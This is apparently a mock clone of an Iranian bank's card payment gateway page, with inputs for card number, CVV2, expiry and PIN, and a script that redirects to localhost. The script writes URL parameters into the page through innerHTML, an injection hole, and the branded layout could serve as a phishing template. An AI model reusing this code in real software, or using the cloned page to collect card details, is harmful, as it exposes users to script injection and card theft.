<!DOCTYPE html>
<html lang="fa">

<head>

	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="description" content="">
	<meta name="keywords" content="">
	<meta name="author" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<title>Internet payment to pay the nation</title>
	<link href="./img/ipg-favicon.ico" rel="shortcut icon">

	<link href="./css.css" rel="stylesheet">


</head>

<body id="body" class="up-scroll" onclick="hideKeypadOnOutsideClick(event);hideCardSuggestionListOnOutSideClick(event)">
	<header id="header">
		<div class="container">
			<div class="beh-card">
				<!-- <a class="change-languge" href="?RefId=93542230DDCC0459&MobileNo=09120651950&lang=en"> -->
					<!-- EN</a> -->

				<div class="row">
					<div class="col shaparaklogo align-self-start"><img src="./img/shaparak_logo.svg" alt="shaparak"></div>
					<div class="col-6 header-center align-self-end">
						<span>Internet payment to pay the nation</span><br>



						<span class="behpardakht_a">www.Behpardakht.com</span>

					</div>
					<div class="col behpardakhtlogo align-self-start"><img src="./img/behpardakht_logo.svg" alt="behpardakht">
					</div>
				</div>
			</div>
		</div>
	</header>

	<div class="main-wrapper payment">
		<section class="container">
			<div class="row row-eq-height">
				<div class="col-lg-8 col-md-12 col-sm-12 order-lg-1 order-2">
					<div class="beh-card carddetail">
						<div class="background-overflow">
							<span class="shape"></span>
						</div>

						<div class="card-header">
							<h3>Card Information</h3>
							<span id="remaining-time">remaining-time:<b>10:00</b></span>

						</div>
						<div class="card-body">
							<form class="card-info">
								<div class="form-group row">
									<div class="col-sm-4">
										<label for="cardnumber" class="col-form-label">card number</label>
										<small>Enter the 16-digit card number written on the card</small>
									</div>

									<div class="col-md-6 col-sm-8 col-12 mobile-justify">
										<div class="cardnumberbox" id="cardnumberbox">
											<span class="banklogo"></span>
											<input type="tel" id="cardnumber" maxlength="19" autocomplete="off"
												onkeydown="preventInvalidKeys(event);setPanCursorPosition(event);"
												onkeyup="formatPanOnKeyUp(event);filterAndShowCardSuggestionList();setBankLogo();focusNextField(this,'inputcvv2',event);resetSelectedPan(event)"
												oninput="formatPanOnKeyUp(event);setBankLogo();focusNextField(this,'inputcvv2',event);resetSelectedPan(event)"
												onfocus="hideKeypad();removeInvalidClassFromPan()" onblur="handlePanChange()" value="">
											<button type="button" id="card-list-button" data-toggle="dropdown" onclick="toggleAllPans()"
												aria-haspopup="true" aria-expanded="false" tabindex="-1"></button>
											<div class="card-suggestionlist dropdown-menu" aria-labelledby="card-list-button">

											</div>
										</div>
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputcvv2" class="col-form-label">Second Identification Number(CVV2)</label>
										<small>Enter the 3 or 4 digit number written on the card</small>
									</div>
									<div class="col-md-6 col-sm-6 col-10  mobile-justify keypad-parent">
										<input type="password" class="form-control" id="inputcvv2" maxlength="4" onfocus="hideOthersKeypad(this);hideCardSuggestionList();removeInvalidClassFromInput('inputcvv2');
                                               showKeypadJustInMobile('inputcvv2',event)" autocomplete="off"
											onkeydown="preventInvalidKeys(event);"
											onkeyup="focusNextField(this,'inputmonth|inputcapcha',event);">
									</div>
									<div class="col-sm-1">
										<button type="button" id="cvv2KeyPad" class="form-btn keypad" tabindex="-1"
											onclick="showKeypad('inputcvv2',event)"></button>
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputmonth" class="col-form-label">Card Expiry Date</label>
										<small>Enter the expiration date of the card </small>
									</div>

									<div class="col-2 d-lg-none d-sm-none"></div>

									<div class="col-md-2 col-sm-3 col-4">
										<input type="tel" class="form-control" id="inputmonth" maxlength="2" placeholder="month"
											autocomplete="off" onkeydown="preventInvalidKeys(event);"
											onfocus="hideKeypad();removeInvalidClassFromInput('inputmonth')"
											onkeyup="focusNextField(this,'inputyear',event);">
									</div>
									<div class="col-md-2 col-sm-3 col-4">
										<input type="tel" class="form-control" id="inputyear" maxlength="2" placeholder="year"
											autocomplete="off" onfocus="removeInvalidClassFromInput('inputmonth')"
											onkeydown="preventInvalidKeys(event);" onkeyup="focusNextField(this,'inputcapcha',event)">
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputcapcha" class="col-form-label">Security code</label>
										<small>Please enter the security code inside the box</small>
									</div>
									<div class="col-sm-3 col-8 mobile-justify">
										<input type="tel" class="form-control" id="inputcapcha" maxlength="5" autocomplete="off"
											onfocus="hideKeypad();removeInvalidClassFromInput('inputcapcha')"
											onkeydown="preventInvalidKeys(event);" onkeyup="focusNextField(this,'inputpin',event)">
									</div>
									<div class="col-sm-3 col-6 capcha-container mobile-justify">
										<!-- <img id="captcha-img" src="./img/ipg-capcha-refresh.svg"> -->
									</div>
									<div class="col-sm-1 col-4">
										<button type="button" id="captcha-button" class="form-btn capcha" title="Show new code"
											onclick="refreshCaptcha()"></button>
									</div>
								</div>
								<div class="form-group row" onblur="hideKeypad()">
									<div class="col-sm-4">
										<label for="inputpin" class="col-form-label">Internet password of the card</label>
										<small>Enter the internet password</small>
									</div>

									<div class="col-md-6 col-sm-6 col-10 mobile-justify keypad-parent">
										<div class="cardnumberbox" id="dynamic-pin">
											<input type="password" class="form-control" id="inputpin" maxlength="12"
												onfocus="hideOthersKeypad(this);hideCardSuggestionList();
                                                   removeInvalidClassFromInput('inputpin');showKeypadJustInMobile('inputpin',event)" autocomplete="off" onkeydown="preventInvalidKeys(event);"
												onkeyup="focusNextField(this,'inputpayerid|payButton',event);">
											<button class="sendpin" type="button" id="otp-button" data-toggle="dropdown"
												onclick="validateAndRequestOTP()" aria-haspopup="true" aria-expanded="false"
												tabindex="-1">Get dynamic password
											</button>
										</div>
									</div>
									<div class="col-sm-1 ">
										<button type="button" class="form-btn keypad" tabindex="-1"
											onclick="showKeypad('inputpin',event)"></button>
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4">
										<label for="inputemail" class="col-form-label">Email</label>
										<small>Please enter a valid email (optional)</small>
									</div>
									<div class="col-md-6 col-sm-8 col-12 mobile-justify">
										<input type="email" class="form-control" id="inputemail"
											onfocus="removeInvalidClassFromInput('inputemail')">
									</div>
								</div>


								<div class="form-group row">
									<div class="col-sm-4"></div>
									<div class="col-sm-8">
										<div class="form-check">
											<input class="form-check-input" type="checkbox" id="savePanCheckbox" checked>
											<label class="form-check-label" for="savePanCheckbox">
												Save the card for later use
											</label>
										</div>
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-4"></div>
									<div class="col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form">
										<span class="card-errorbox shaparak_shit_message">Please enter the required information correctly
											Do</span>
									</div>
								</div>
								<div class="form-group row">
									<div class="col-sm-4"></div>
									<div class="col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form">
										<button type="button" class="btn btn-perches" id="payButton"
											onclick="success()">Payment</button>
										<button type="button" class="btn btn-decline" onclick="cancelPay()">Cancel</button>
									</div>
								</div>
							</form>
						</div>
					</div>
				</div>

				<div class="col-lg-4 col-md-12 col-sm-12 order-lg-2 order--1">
					<div class="beh-card merchantdetail">
						<div class="card-header">
							<h3>Acceptor information</h3>
						</div>
						<div class="card-body">

							<div class="merchant-container">
								<div class="col-lg-12 col-sm-4 merchant-logo-mobile">
									<!--<img class=" " src="img/sample/merchant-logo.png" alt="merchantlogo">-->
									<img class=" " src="./img/ipg-defaltlogo.png" alt="merchantlogo">
									<span class="helper"></span>
								</div>

								<ul class="col-lg-12 col-sm-8 merchant-detail">
									<li>Acceptor name: <b>Fourgah Parsian</b></li>
									<li>Order number: <b id='order-number' >2370746</b></li>
									<li> Buyer Name: <b id='params-name'>5827069</b></li>
									<li>Website address:
										<b class="merchantwebsite">
											<span class="merchant_a" title="http://www.digikala.com"> http://www.parsian.com </span>
										</b>
									</li>
								</ul>
							</div>

							<ul class="merchant-detail price">
								<li>Payable amount:<b class="price-number">2,700,000 &nbsp; Rial</b></li>
							</ul>
						</div>

					</div>

				</div>
			</div>
		</section>

		<div class="keypad-container">
			<h4>
				<div class="input-group input-group-sm"> <span class="form-control border_none " aria-describedby="closeBtn">
						صفحه کلید امن</span>
					<div class="input-group-prepend "> <button id="closeBtn" type="button" class="close-button-pinpad"
							onclick="hideKeypad()"></button> </div>
				</div>
			</h4>
			<div class="frame-umbtn"><button id="num1" type="button" class=" numpad" tabindex="-1"
					onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num2" type="button" class=" numpad" tabindex="-1"
					onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num3" type="button" class=" numpad" tabindex="-1"
					onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num4" type="button" class=" numpad" tabindex="-1"
					onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num5" type="button" class=" numpad" tabindex="-1"
					onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num6" type="button" class=" numpad" tabindex="-1"
					onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num7" type="button" class=" numpad" tabindex="-1"
					onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num8" type="button" class=" numpad" tabindex="-1"
					onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="clear" type="button" class=" numpad" tabindex="-1"
					onclick="keyPadBackspace(event)">&#9003;</button></div>
			<div class="frame-umbtn"><button id="num9" type="button" class=" numpad" tabindex="-1"
					onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="num0" type="button" class=" numpad" tabindex="-1"
					onclick="fillField(this,event)"></button></div>
			<div class="frame-umbtn"><button id="tab-key" type="button" class=" numpad" tabindex="-1" onclick="keypadTab()"
					style="color: #27d286;">&#10004;</button></div>
		</div>




		<div class="modal large-modal top_layer fade show" id="dynamic-pin-modal" tabindex="-1" role="dialog"
			aria-labelledby="ModalLabel" aria-hidden="true" style="display: none">
			<div class="modal-dialog modal-dialog-centered" role="document">
				<div class="modal-content">
					<div class="modal-header">
						<h5 class="modal-title">توجه</h5>
						<button type="button" onclick="removeDynamicPinDialog();focusField('inputcvv2')" class="close"
							data-dismiss="modal" aria-label="Close">
							<span aria-hidden="true">&times;</span>
						</button>
					</div>
					<div class="modal-body">
						<p>Dear customer, there is no need to press the dynamic password request button under the following conditions:
							enter your password in the second password field. If so far relative to dynamic
							You have not created a second password for your card, you can use your static password until 11/05/30 at the latest.
							Tell me.</p>
					</div>
					<div class="modal-footer">
						<button type="button" id="dynamic-pin-dialog-button" class="btn btn-primary"
							onclick="removeDynamicPinDialog();focusField('inputcvv2')">متوجه شدم</button>
					</div>
				</div>
			</div>
		</div>
		<div class="modal-backdrop fade show" id="dynamic-pin-modal-backdrop" style="display: none"></div>

		<section class="container">
			<row class="beh-guid">

			</row>
		</section>
		<section class="container">
			<row class="beh-guid">

			</row>
		</section>
	</div>
	<footer class="footer">
		<div class="container">
			<div class="footerarc"></div>
			<div class="footerarc content">
				<span class="call">Call number: 15085061026</span><br>
				<span>Mallat Payment Company provides new electronic payment services</span>
			</div>
			<div class="row justify-content-center">
				<div class="col-12">

				</div>
			</div>
		</div>
	</footer>

	<form method="post" name="returnForm"
		action="https://api.mydigipay.com/digipay/api/purchases/ipg/result?pspCode=003&traceId=dfd02981-58c9-4f4c-b035-9b8ea5bd77cd">
		<input type="hidden" id="RefId" name="RefId" value="93542230DDCC0459">
		<input type="hidden" id="ResCode" name="ResCode">
		<input type="hidden" id="SaleOrderId" name="SaleOrderId" value="91848372">
	</form>
	<form method="post" name="resultForm" action="result.mellat" accept-charset="UTF-8">
		<input type="hidden" name="RefId" value="93542230DDCC0459">
	</form>

	<script>
		const urlSearchParams = new URLSearchParams(window.location.search);
		const params = Object.fromEntries(urlSearchParams.entries());
		console.log(params)

		const orderNumberText=document.getElementById('order-number')
		orderNumberText.innerHTML=params.number

		const name=document.getElementById('params-name')
		name.innerHTML=params.name

		function success(){
			window.location.href=`http://localhost:3000/payment-result/success/${params.number}/${params.id}`
		}
		function cancelPay(){
			window.location.href=`http://localhost:3000/payment-result/cancel/${params.number}/${params.id}`
		}
	</script>
</body>

</html>